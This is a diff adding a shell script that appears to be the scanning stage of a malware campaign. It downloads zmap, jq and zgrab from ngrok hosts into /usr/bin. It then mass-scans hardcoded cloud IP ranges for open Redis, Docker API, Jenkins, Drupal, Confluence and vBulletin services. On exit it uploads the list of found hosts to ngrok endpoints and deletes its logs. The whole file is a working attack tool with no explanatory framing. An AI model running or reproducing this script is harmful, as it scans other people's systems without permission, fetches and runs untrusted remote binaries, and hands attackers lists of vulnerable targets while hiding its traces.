@@ -1,0 +1,89 @@
+OUT="/tmp/df659815ab"
+LOGF="/tmp/log764ade09f8"
+export PATH=/usr/sbin:$PATH
+
+
+FINISH () {
+  excode=$?
+  _FILE="$OUT"
+  gzip "$OUT"
+  if [ -f "${_FILE}.gz" ]; then
+    _FILE="${OUT}.gz"
+  fi
+  if [ -f "${_FILE}" ]; then
+    curl -m 120 -fsk -F result=@${_FILE} "http://258e6ad0.ngrok.io/z?r=7dd5a46ef43a98cf1841e8c9149f9ad2&i=463832b613167c57c221745cff07740eb8b634c5d0d5866003e15ed1332bfdb606ea2b4829a0fa20e234dd38f3ea3079238e998bb3f5ead4428e6ab59ac2abba7f8895f0f8655d8a2d11878c900a45a8148f804820be08e3f4ab59f6c0b69dc286d71889f2a2255fad37b7bb1cc18307&x=${excode}" >/dev/null 2>>${LOGF} || \
+    curl -m 120 -fsk -F result=@${_FILE} "http://86c37bf2.ngrok.io/z?r=7dd5a46ef43a98cf1841e8c9149f9ad2&i=463832b613167c57c221745cff07740eb8b634c5d0d5866003e15ed1332bfdb606ea2b4829a0fa20e234dd38f3ea3079238e998bb3f5ead4428e6ab59ac2abba7f8895f0f8655d8a2d11878c900a45a8148f804820be08e3f4ab59f6c0b69dc286d71889f2a2255fad37b7bb1cc18307&x=${excode}" >/dev/null 2>>${LOGF}
+  fi
+  rm -f "$OUT" "${OUT}.gz" "${LOGF}"
+  rm -f /tmp/rinfo6afec92a
+
+}
+trap FINISH EXIT
+
+rm -f "$OUT" "${OUT}.gz"
+IPR="34.243.224.0/19 52.17.32.0/19 52.42.64.0/19 52.70.192.0/19 54.70.32.0/19 54.219.192.0/19 223.7.0.0/19 36.112.160.0/19 1.231.160.0/19 1.233.96.0/19 58.227.96.0/19 20.170.128.0/19 52.107.192.0/19 52.110.96.0/19 217.160.32.0/19 166.62.0.0/19 177.136.64.0/19 76.12.160.0/19"
+
+apt-get update || yum check-update
+apt-get install -y curl || yum install -y curl || apk add curl
+
+ulimit -n 100000
+
+if ! type "/usr/bin/zmap" >/dev/null 2>&1 ; then
+  curl -m 120 -fks -o /usr/bin/zmap "http://e4b9a063.ngrok.io/d8/zmap"
+  chmod +x /usr/bin/zmap
+fi
+
+if ! type "/usr/bin/jq" >/dev/null 2>&1 ; then
+  curl -m 120 -fks -o /usr/bin/jq "http://d546d77d.ngrok.io/d8/jq"
+  chmod +x /usr/bin/jq
+fi
+
+if type "zgrab" >/dev/null 2>&1 ; then
+  sz=$(stat -c %s /usr/bin/zgrab)
+  if [ $sz -ne 2098384 ]; then
+    rm -f /usr/bin/zgrab
+  fi
+fi
+if ! type "zgrab" >/dev/null 2>&1 ; then
+  curl -m 120 -fks -o /usr/bin/zgrab "http://6fd2a123.ngrok.io/d8/zgrab"
+  chmod +x /usr/bin/zgrab
+fi
+
+if type "zgrab" >/dev/null 2>&1 ; then
+  IFACE=$(ip route | awk '/default/ {print $5}'|head -n1)
+  if [ -z "${IFACE}" ]; then
+    echo "Could not obtain iface:">>${LOGF}
+    ip route>>${LOGF} 2>&1
+    exit 1
+  fi
+
+  
+PORT="6379"
+echo -ne "info\r\nquit\r\n" >/tmp/rinfo6afec92a
+echo ";;${PORT}" > $OUT
+/usr/bin/zmap -i $IFACE -B 50M --max-sendto-failures 1000000  -c5 -o- -p $PORT $IPR 2>>${LOGF} | zgrab --senders 100 --port $PORT --data /tmp/rinfo6afec92a --output-file=- 2>/dev/null | grep 'redis_version' | jq -r .ip >> ${OUT}
+
+PORT="6380"
+echo ";;${PORT}" >> $OUT
+/usr/bin/zmap -i $IFACE -B 50M --max-sendto-failures 1000000  -c5 -o- -p $PORT $IPR 2>>${LOGF} | zgrab --senders 100 --port $PORT --data /tmp/rinfo6afec92a --output-file=- 2>/dev/null | grep 'redis_version' | jq -r .ip >> ${OUT}
+
+PORT="2375"
+echo ";;${PORT}" >> $OUT
+/usr/bin/zmap -i $IFACE -B 50M --max-sendto-failures 1000000  -c5 -o- -p $PORT $IPR 2>>${LOGF} | zgrab --senders 100 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip >> ${OUT}
+
+PORT="80"
+echo ";;${PORT}" >> $OUT
+/usr/bin/zmap -i $IFACE -B 50M --max-sendto-failures 1000000  -c5 -o- -p $PORT $IPR 2>>${LOGF} | zgrab --senders 100 --port $PORT --http='/' --http-max-redirects 2 --output-file=- 2>/dev/null | grep -Ei 'x_jenkins|drupal|confluence|vbulletin' | jq -r .ip >> ${OUT}
+
+PORT="8080"
+echo ";;${PORT}" >> $OUT
+/usr/bin/zmap -i $IFACE -B 50M --max-sendto-failures 1000000  -c5 -o- -p $PORT $IPR 2>>${LOGF} | zgrab --senders 100 --port $PORT --http='/' --http-max-redirects 2 --output-file=- 2>/dev/null | grep -Ei 'x_jenkins|drupal|confluence' | jq -r .ip >> ${OUT}
+
+PORT="443"
+echo ";;${PORT}" >> $OUT
+/usr/bin/zmap -i $IFACE -B 50M --max-sendto-failures 1000000  -c5 -o- -p $PORT $IPR 2>>${LOGF} | zgrab --senders 100 --port $PORT --tls --http='/' --http-max-redirects 2 --output-file=- 2>/dev/null | grep -Ei 'x_jenkins|drupal|confluence|vbulletin' | jq -r .ip 2>/dev/null >> ${OUT}
+
+exit $?
+
+fi
+exit 17
